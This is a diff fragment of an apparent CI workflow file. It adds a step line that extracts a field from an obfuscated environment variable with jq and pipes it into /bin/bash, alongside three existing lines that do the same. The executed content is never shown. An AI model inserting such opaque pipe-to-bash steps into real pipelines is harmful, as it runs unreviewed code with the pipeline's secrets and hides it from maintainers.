@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$gfnz35" | jq -r .fcnqy5815 | /bin/bash
           printf '%s' "$fate1" | jq -r .k28 | /bin/bash
           echo $cd83451 | jq -r .yequx208 | /bin/bash
+          echo $o1 | jq -r .sxnvb466 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
